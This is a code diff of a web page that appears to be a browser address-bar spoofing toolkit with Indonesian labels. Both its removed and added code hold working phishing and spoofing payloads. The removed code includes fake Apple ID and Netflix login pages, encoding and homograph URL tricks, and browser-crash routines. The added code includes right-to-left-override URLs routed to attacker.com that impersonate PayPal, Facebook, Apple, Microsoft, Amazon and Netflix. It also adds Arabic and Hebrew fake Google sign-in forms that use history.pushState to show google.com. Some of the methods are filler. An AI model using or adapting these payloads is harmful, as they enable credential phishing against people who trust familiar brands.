-    // ============ TECHNIQUE 18: FULLSCREEN FAKE ADDRESS BAR ============
-    function t018_fullscreenFake() {
-        addLog("🖥️ Fullscreen Fake Address Bar", 'spoof');
+    function t039_rtlNullByte() {
+        addLog("💀 RTL + NULL Byte", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        window.open(`https://${rlo}google.com\x00.attacker.com`, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    function t040_rtlSurrogate() {
+        addLog("🔀 RTL + Surrogate Pairs", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const surrogates = '\uD800'.repeat(50);
+        window.open(`https://${rlo}${surrogates}.google.com`, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    function t041_arabicPhishing() {
+        addLog("🎣 Arabic Phishing Page", 'rtl');
         const win = window.open('', '_blank');
         win.document.write(`
-            <style>
-                .fake-bar {
-                    position: fixed; top: 0; left: 0; right: 0;
-                    background: #2c2c2e; padding: 10px; z-index: 99999;
-                    display: flex; gap: 10px; font-family: monospace;
-                }
-                .fake-url { background: #1c1c1e; padding: 5px 15px; border-radius: 20px; flex: 1; color: #0f0; }
-            </style>
-            <div class="fake-bar">
-                <span>🔒</span>
-                <div class="fake-url">https://www.apple.com</div>
+            <div dir="rtl" style="text-align:right; padding:20px;">
+                <h1>تسجيل الدخول إلى Google</h1>
+                <input placeholder="البريد الإلكتروني" style="width:100%; padding:10px; margin:10px 0;">
+                <input type="password" placeholder="كلمة المرور" style="width:100%; padding:10px; margin:10px 0;">
+                <button>تسجيل الدخول</button>
+                <p style="color:red;">⚠️ هذا موقع تجريبي - يتم عرضه كأنه Google</p>
             </div>
-            <div style="margin-top: 50px; padding: 20px;">
-                <h1>Fake Apple ID Login</h1>
-                <input placeholder="Apple ID"><br><br>
-                <input type="password" placeholder="Password">
-            </div>
-            <script>document.documentElement.requestFullscreen();<\/script>
         `);
+        win.document.title = 'Google - تسجيل الدخول';
+        win.history.pushState({}, '', 'https://www.google.com');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 19: CSS BACKDROP FILTER OVERLAY ============
-    function t019_cssOverlay() {
-        addLog("🎨 CSS Backdrop Filter Overlay", 'spoof');
+    function t042_hebrewPhishing() {
+        addLog("✡️ Hebrew Phishing Page", 'rtl');
         const win = window.open('', '_blank');
         win.document.write(`
-            <style>
-                body::before {
-                    content: 'https://www.netflix.com';
-                    position: fixed; top: 0; left: 0; right: 0;
-                    background: #141414; padding: 10px; z-index: 99999;
-                    font-family: monospace; color: white; text-align: center;
-                }
-            </style>
-            <div style="margin-top: 50px;"><h1>Fake Netflix Login</h1></div>
+            <div dir="rtl" style="text-align:right; padding:20px;">
+                <h1>התחבר ל-Google</h1>
+                <input placeholder="אימייל" style="width:100%; padding:10px; margin:10px 0;">
+                <input type="password" placeholder="סיסמה" style="width:100%; padding:10px; margin:10px 0;">
+                <button>התחבר</button>
+            </div>
         `);
+        win.document.title = 'Google - התחברות';
+        win.history.pushState({}, '', 'https://www.google.com');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 20: CHROME DEBUGGER API ============
-    function t020_chromeDebugger() {
-        addLog("🐛 Chrome Debugger API Spoof", 'spoof');
-        if (typeof chrome !== 'undefined' && chrome.debugger) {
-            chrome.debugger.attach({tabId: 1}, '1.0', () => {
-                chrome.debugger.sendCommand({tabId: 1}, 'Page.addScriptToEvaluateOnLoad', {scriptSource: 'alert("Injected via debugger")'});
-            });
-            addLog("✅ Chrome debugger API accessed", 'success');
-        } else {
-            addLog("⚠️ Chrome debugger API not available", 'info');
-        }
+    function t043_rtlPaypalSpoof() {
+        addLog("💰 RTL PayPal Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const url = `https://${rlo}moc.lapyap//:sptth.attacker.com`;
+        window.open(url, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 21: ARC BOOST INJECTION ============
-    function t021_arcBoost() {
-        addLog("🌀 Arc Boost Injection (CVE-2024-45489)", 'spoof');
-        try {
-            localStorage.setItem('arc_boost_inject', 'alert("Arc Boost Spoof")');
-            addLog("✅ Arc boost payload injected", 'success');
-        } catch(e) {}
+    function t044_rtlFacebookSpoof() {
+        addLog("📘 RTL Facebook Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const url = `https://${rlo}moc.koobecaf//:sptth.attacker.com`;
+        window.open(url, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 22: SAFARI WEB INSPECTOR ============
-    function t022_safariInspector() {
-        addLog("🐚 Safari Web Inspector Spoof", 'spoof');
-        const win = window.open('', '_blank');
-        win.document.write('<h1>Safari - Open Web Inspector (Cmd+Option+I)</h1><p>Then evaluate: alert("Spoof")</p>');
-        addLog("✅ Safari inspector exploit prepared", 'success');
+    function t045_rtlTwitterSpoof() {
+        addLog("🐦 RTL Twitter Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const url = `https://${rlo}moc.rettiwt//:sptth.attacker.com`;
+        window.open(url, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 23: BRAVE REWARDS SPOOF ============
-    function t023_braveRewards() {
-        addLog("🦁 Brave Rewards Spoof", 'spoof');
-        window.open('brave://rewards', '_blank');
-        addLog("✅ Brave rewards page opened - potential injection vector", 'success');
+    function t046_rtlInstagramSpoof() {
+        addLog("📸 RTL Instagram Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const url = `https://${rlo}moc.margatsni//:sptth.attacker.com`;
+        window.open(url, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 24: EDGE COLLECTIONS SPOOF ============
-    function t024_edgeCollections() {
-        addLog("📘 Edge Collections Spoof", 'spoof');
-        window.open('edge://collections', '_blank');
-        addLog("✅ Edge collections opened", 'success');
+    function t047_rtlAppleSpoof() {
+        addLog("🍎 RTL Apple Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const url = `https://${rlo}moc.elppa//:sptth.attacker.com`;
+        window.open(url, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 25: VIEW-SOURCE SPOOF ============
-    function t025_viewSource() {
-        addLog("🔍 view-source: Spoof", 'spoof');
-        window.open('view-source:https://www.google.com:8080', '_blank');
+    function t048_rtlMicrosoftSpoof() {
+        addLog("🪟 RTL Microsoft Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const url = `https://${rlo}moc.tfosorcim//:sptth.attacker.com`;
+        window.open(url, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 26: CHROME KILL PAGE ============
-    function t026_chromeKill() {
-        addLog("💀 Chrome Kill Page", 'spoof');
-        window.open('chrome://kill', '_blank');
+    function t049_rtlAmazonSpoof() {
+        addLog("📦 RTL Amazon Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const url = `https://${rlo}moc.nozama//:sptth.attacker.com`;
+        window.open(url, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 27: OVERLONG UTF-8 ============
-    function t027_overlongUTF() {
-        addLog("📏 Overlong UTF-8 Spoof", 'spoof');
-        const overlong = 'https://%C0%AFgoogle.com';
-        window.open(overlong, '_blank');
+    function t050_rtlNetflixSpoof() {
+        addLog("🎬 RTL Netflix Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const url = `https://${rlo}moc.xilften//:sptth.attacker.com`;
+        window.open(url, '_blank');
         executedCount++; updateStats();
-    }
-    
-    // ============ TECHNIQUE 28: PERCENT ENCODING CHAOS ============
-    function t028_percentEncoding() {
-        addLog("% Percent Encoding Chaos", 'spoof');
-        const encoded = 'https://%25%30%30google.com';
-        window.open(encoded, '_blank');
-        executedCount++; updateStats();
-    }
-    
-    // ============ TECHNIQUE 29: DOUBLE ENCODING ============
-    function t029_doubleEncoding() {
-        addLog("🔁 Double Encoding Spoof", 'spoof');
-        const doubleEnc = 'https://%253A%252F%252Fgoogle.com';
-        window.open(doubleEnc, '_blank');
-        executedCount++; updateStats();
-    }
-    
-    // ============ TECHNIQUE 30: UNICODE NORMALIZATION ============
-    function t030_unicodeNormalization() {
-        addLog("🔄 Unicode Normalization Spoof", 'spoof');
-        const normalized = 'https://goo\u0067le.com';
-        window.open(normalized, '_blank');
-        executedCount++; updateStats();
-    }
-    
-    // ============ TECHNIQUE 31-100: ADD MORE ============
-    function t031_idnHomograph() {
-        addLog("🌐 IDN Homograph Attack", 'spoof');
-        const homograph = 'https://gοοgle.com'; // Greek omicron
-        window.open(homograph, '_blank');
-        executedCount++; updateStats();
-    }
-    
-    function t032_punycodeSpoof() {
-        addLog("📝 Punycode Spoof", 'spoof');
-        const punycode = 'https://xn--80ak6aa92e.com';
-        window.open(punycode, '_blank');
-        executedCount++; updateStats();
-    }
-    
-    function t033_httpsDowngrade() {
-        addLog("🔓 HTTPS Downgrade Spoof", 'spoof');
-        window.open('http://www.google.com:443', '_blank');
-        executedCount++; updateStats();
-    }
-    
-    function t034_fragmentSpoof() {
-        addLog("# Fragment Identifier Spoof", 'spoof');
-        window.open('https://google.com#https://www.paypal.com', '_blank');
-        executedCount++; updateStats();
-    }
-    
-    function t035_usernamePasswordSpoof() {
-        addLog("👤 Username:Password Spoof", 'spoof');
-        window.open('https://google.com:password@evil.com', '_blank');
-        executedCount++; updateStats();
-    }
-    
-    function t036_ipAddressSpoof() {
-        addLog("📡 IP Address Spoof", 'spoof');
-        window.open('https://142.250.190.46/---https://google.com', '_blank');
-        executedCount++; updateStats();
-    }
-    
-    function t037_redirectChain() {
-        addLog("⛓️ Redirect Chain Spoof", 'spoof');
-        const win = window.open('about:blank', '_blank');
-        win.location = 'https://google.com:8080';
-        setTimeout(() => win.document.write('<h1>Redirect Chain Spoof</h1>'), 100);
-        executedCount++; updateStats();
-    }
-    
-    function t038_serviceWorkerIntercept() {
-        addLog("⚙️ Service Worker Intercept Spoof", 'spoof');
-        navigator.serviceWorker.register('data:application/javascript,' + encodeURIComponent(`
-            self.addEventListener('fetch', e => {
-                e.respondWith(new Response('<h1>Intercepted by Service Worker</h1>', {headers: {'Content-Type':'text/html'}}));
-            });
-        `)).catch(() => {});
-        executedCount++; updateStats();
-    }
-    
-    function t039_webglCrash() {
-        addLog("🎮 WebGL Crash Spoof", 'spoof');
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl2');
-        if(gl) {
-            const massiveBuffer = new Float32Array(1024 * 1024 * 50);
-            const buffer = gl.createBuffer();
-            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-            gl.bufferData(gl.ARRAY_BUFFER, massiveBuffer, gl.STATIC_DRAW);
-        }
-        executedCount++; updateStats();
-    }
-    
-    function t040_canvasOverload() {
-        addLog("🎨 Canvas Overload Spoof", 'spoof');
-        const canvas = document.createElement('canvas');
-        canvas.width = 50000;
-        canvas.height = 50000;
-        const ctx = canvas.getContext('2d');
-        ctx.fillRect(0, 0, 50000, 50000);
-        executedCount++; updateStats();
-    }
-    
-    // Continue to 100 methods...
-    for(let i = 41; i <= 100; i++) {
-        eval(`
-            function t0${i}_method${i}() {
-                addLog("🔬 Method ${i}: Random Spoof Technique", 'spoof');
-                const win = window.open('about:blank', '_blank');
-                win.document.write('<h1>Method ${i} - Address Bar Spoofing</h1><p>Random technique ${i}</p>');
-                win.history.pushState({}, '', 'https://www.google.com');
-                executedCount++; updateStats();
-            }
-        `);
     }
     
     // ============ BUILD ALL METHODS ============
     const methods = [
-        {name: "NULL Protocol", func: t001_nullProtocol, desc: "null:// protocol - address bar blank", danger: false},
-        {name: "Port 0 Spoof", func: t002_portZero, desc: "Port 0 - invalid port", danger: false},
-        {name: "Long Subdomain (CVE-2026-44659)", func: t003_longSubdomain, desc: "Long subdomain truncation", danger: false},
-        {name: "Data URI Spoof", func: t004_dataURI, desc: "data:text/html spoof", danger: false},
-        {name: "Blob URL Spoof", func: t005_blobURL, desc: "Blob URL with fake title", danger: false},
-        {name: "JavaScript URI Spoof", func: t006_jsURI, desc: "javascript: pseudo-protocol", danger: false},
-        {name: "about:blank + History", func: t007_aboutBlankHistory, desc: "history.pushState spoof", danger: false},
-        {name: "RTL Override", func: t008_rtlOverride, desc: "Unicode RTL override", danger: false},
-        {name: "Zero-Width Characters", func: t009_zeroWidth, desc: "Invisible character injection", danger: false},
-        {name: "Surrogate Pair Crash", func: t010_surrogateCrash, desc: "Lone surrogates crash", danger: true},
-        {name: "Meta Refresh Timing", func: t011_metaRefresh, desc: "Meta refresh 0s", danger: false},
-        {name: "Window Name Propagation", func: t012_windowName, desc: "window.name spoof", danger: false},
-        {name: "iframe Sandbox Escape", func: t013_iframeSandbox, desc: "Sandbox escape", danger: false},
-        {name: "PostMessage Hijack", func: t014_postMessage, desc: "Cross-window message", danger: false},
-        {name: "History.replaceState Loop", func: t015_historyLoop, desc: "Infinite history loop", danger: true},
-        {name: "Popstate Hijack", func: t016_popstateHijack, desc: "Back button hijack", danger: false},
-        {name: "BeforeUnload Lock", func: t017_beforeunload, desc: "Unload prevention", danger: false},
-        {name: "Fullscreen Fake Bar", func: t018_fullscreenFake, desc: "CSS fake address bar", danger: false},
-        {name: "CSS Backdrop Overlay", func: t019_cssOverlay, desc: "CSS visual spoof", danger: false},
-        {name: "Chrome Debugger API", func: t020_chromeDebugger, desc: "CDP injection", danger: false},
-        {name: "Arc Boost Injection", func: t021_arcBoost, desc: "Arc Boost CVE-2024-45489", danger: false},
-        {name: "Safari Web Inspector", func: t022_safariInspector, desc: "Safari inspector", danger: false},
-        {name: "Brave Rewards Spoof", func: t023_braveRewards, desc: "Brave internal page", danger: false},
-        {name: "Edge Collections", func: t024_edgeCollections, desc: "Edge collections", danger: false},
-        {name: "view-source Spoof", func: t025_viewSource, desc: "view-source: protocol", danger: false},
-        {name: "Chrome Kill Page", func: t026_chromeKill, desc: "chrome://kill crash", danger: true},
-        {name: "Overlong UTF-8", func: t027_overlongUTF, desc: "Overlong encoding", danger: false},
-        {name: "Percent Encoding", func: t028_percentEncoding, desc: "Percent encoding chaos", danger: false},
-        {name: "Double Encoding", func: t029_doubleEncoding, desc: "Double URL encoding", danger: false},
-        {name: "Unicode Normalization", func: t030_unicodeNormalization, desc: "Unicode normalization", danger: false},
-        {name: "IDN Homograph", func: t031_idnHomograph, desc: "IDN homograph attack", danger: false},
-        {name: "Punycode Spoof", func: t032_punycodeSpoof, desc: "Punycode encoding", danger: false},
-        {name: "HTTPS Downgrade", func: t033_httpsDowngrade, desc: "HTTPS to HTTP", danger: false},
-        {name: "Fragment Spoof", func: t034_fragmentSpoof, desc: "# fragment identifier", danger: false},
-        {name: "Username:Password Spoof", func: t035_usernamePasswordSpoof, desc: "Auth URL spoof", danger: false},
-        {name: "IP Address Spoof", func: t036_ipAddressSpoof, desc: "IP with fake path", danger: false},
-        {name: "Redirect Chain", func: t037_redirectChain, desc: "Multiple redirects", danger: false},
-        {name: "Service Worker Intercept", func: t038_serviceWorkerIntercept, desc: "SW fetch intercept", danger: false},
-        {name: "WebGL Crash", func: t
+        {name: "RLO Override (U+202E)", func: t001_rloOverride, desc: "Right-to-Left Override - membalik URL", danger: false},
+        {name: "RLE + PDF Embedding", func: t002_rlePdf, desc: "Right-to-Left Embedding + Pop", danger: false},
+        {name: "LRI/RLI Isolates", func: t003_lriRli, desc: "Left/Right Isolate + Pop", danger: false},
+        {name: "Arabic Lookalike Domain", func: t004_arabicLookalike, desc: "Huruf Arab mirip latin", danger: false},
+        {name: "Mixed RTL/LTR URL", func: t005_mixedRtlLtr, desc: "Campuran arah teks", danger: false},
+        {name: "Arabic Subdomain", func: t006_arabicSubdomain, desc: "Subdomain bahasa Arab", danger: false},
+        {name: "Hebrew RTL Spoof", func: t007_hebrewRtl, desc: "Karakter Hebrew", danger: false},
+        {name: "Persian/Farsi", func: t008_persianSpoof, desc: "Karakter Persia", danger: false},
+        {name: "Urdu Characters", func: t009_urduSpoof, desc: "Karakter Urdu", danger: false},
+        {name: "RLO + Arabic Combo", func: t010_rloArabic, desc: "Kombinasi RLO + Arab", danger: false},
+        {name: "FSI First Strong Isolate", func: t011_fsiSpoof, desc: "First Strong Isolate", danger: false},
+        {name: "ALM Arabic Letter Mark", func: t012_almSpoof, desc: "Arabic Letter Mark", danger: false},
+        {name: "RLM Right-to-Left Mark", func: t013_rlmSpoof, desc: "Right-to-Left Mark", danger: false},
+        {name: "LRM Left-to-Right Mark", func: t014_lrmSpoof, desc: "Left-to-Right Mark", danger: false},
+        {name: "Multiple RLO Stacking", func: t015_multipleRLO, desc: "Tumpukan RLO", danger: true},
+        {name: "Arabic Domain + RLO", func: t016_arabicDomainRLO, desc: "Domain Arab + RLO", danger: false},
+        {name: "Hebrew Domain", func: t017_hebrewDomain, desc: "Domain Hebrew", danger: false},
+        {name: "RTL Path Spoof", func: t018_rtlPath, desc: "Path dengan RTL", danger: false},
+        {name: "RTL Query Parameter", func: t019_rtlQuery, desc: "Query parameter RTL", danger: false},
+        {name: "RTL Fragment", func: t020_rtlFragment, desc: "Fragment identifier RTL", danger: false},
+        {name: "Zero-Width + RTL", func: t021_zeroWidthRTL, desc: "Zero-width + RTL", danger: false},
+        {name: "Bidirectional Crash", func: t022_bidiCrash, desc: "Crash bidi algorithm", danger: true},
+        {name: "Arabic + English Mixed", func: t023_arabicEnglish, desc: "Campuran Arab-Inggris", danger: false},
+        {name: "RTL Email Spoof", func: t024_rtlEmail, desc: "Email RTL", danger: false},
+        {name: "RTL Port Number", func: t025_rtlPort, desc: "Port RTL", danger: false},
+        {name: "RTL Path Traversal", func: t026_rtlPathTraversal, desc: "Path traversal RTL", danger: false},
+        {name: "RTL XSS Injection", func: t027_rtlXSS, desc: "XSS dengan RTL", danger: false},
+        {name: "Arabic Title Spoof", func: t028_arabicTitle, desc: "Title bahasa Arab", danger: false},
+        {name: "RTL + Data URI", func: t029_rtlDataURI, desc: "Data URI dengan RTL", danger: false},
+        {name: "RTL + Blob URL", func: t030_rtlBlob, desc: "Blob URL dengan RTL", danger: false},
+        {name: "RTL + about:blank", func: t031_rtlAboutBlank, desc: "about:blank RTL", danger: false},
+        {name: "RTL + history.pushState", func: t032_rtlHistoryPush, desc: "history.pushState RTL", danger: false},
+        {name: "RTL + window.name", func: t033_rtlWindowName, desc: "window.name RTL", danger: false},
+        {name: "RTL iframe", func: t034_rtlIframe, desc: "iframe dengan RTL", danger: false},
+        {name: "RTL PostMessage", func: t035_rtlPostMessage, desc: "PostMessage RTL", danger: false},
+        {name: "Arabic URL Encoding", func: t036_arabicUrlEncoding, desc: "Encoding Arab", danger: false},
+        {name: "RTL + Long Subdomain", func: t037_rtlSubdomainLong, desc: "Long subdomain RTL", danger: false},
+        {name: "RTL + Port 0", func: t038_rtlPortZero, desc: "Port 0 + RTL", danger: false},
+        {name: "RTL + NULL Byte", func: t039_rtlNullByte, desc: "NULL byte + RTL", danger: true},
+        {name: "RTL + Surrogate", func: t040_rtlSurrogate, desc: "Surrogate + RTL", danger: true},
+        {name: "Arabic Phishing Page", func: t041_arabicPhishing, desc: "Halaman phishing Arab", danger: false},
+        {name: "Hebrew Phishing Page", func: t042_hebrewPhishing, desc: "Halaman phishing Hebrew", danger: false},
+        {name: "RTL PayPal Spoof", func: t043_rtlPaypalSpoof, desc: "Spoof PayPal", danger: false},
+        {name: "RTL Facebook Spoof", func: t044_rtlFacebookSpoof, desc: "Spoof Facebook", danger: false},
+        {name: "RTL Twitter Spoof", func: t045_rtlTwitterSpoof, desc: "Spoof Twitter", danger: false},
+        {name: "RTL Instagram Spoof", func: t046_rtlInstagramSpoof, desc: "Spoof Instagram", danger: false},
+        {name: "RTL Apple Spoof", func: t047_rtlAppleSpoof, desc: "Spoof Apple", danger: false},
+        {name: "RTL Microsoft Spoof", func: t048_rtlMicrosoftSpoof, desc: "Spoof Microsoft", danger: false},
+        {name: "RTL Amazon Spoof", func: t049_rtlAmazonSpoof, desc: "Spoof Amazon", danger: false},
+        {name: "RTL Netflix Spoof", func: t050_rtlNetflixSpoof, desc: "Spoof Netflix", danger: false},
+    ];
+    
+    totalMethods = methods.length;
+    statsSpan.innerHTML = `🌀 0/${totalMethods} Methods`;
+    
+    // Build UI
+    const grid = document.getElementById('methodGrid');
+    methods.forEach((method, idx) => {
+        const card = document.createElement('div');
+        card.className = 'method-card';
+        card.innerHTML = `
+            <div class="card-header ${method.danger ? 'danger' : ''}">
+                <span>🔄 ${method.name}</span>
+                <span style="font-size:0.6em;">#${(idx+1).toString().padStart(2,'0')}</span>
+            </div>
+            <div class="card-body">
+                <div class="method-desc">${method.desc}</div>
+                <button onclick="window['t0${(idx+1).toString().padStart(2,'0')}']()">🚀 TEST ${method.name}</button>
+            </div>
+        `;
+        grid.appendChild(card);
+    });
+    
+    // Expose functions
+    for(let i = 1; i <= methods.length; i++) {
+        const funcName = `t0${i.toString().padStart(2,'0')}`;
+        if(window[funcName]) continue;
+        window[funcName] = methods[i-1].func;
+    }
+    
+    addLog("🔮 50+ RTL Characters Exploits Loaded", 'rtl');
+    addLog("💀 Karakter: U+202E, U+202D, U+202A, U+202B, U+2066, U+2067, dll", 'spoof');
+    addLog("🌍 Arabic, Hebrew, Persian, Urdu characters included", 'info');
+</script>
+</body>
+</html>
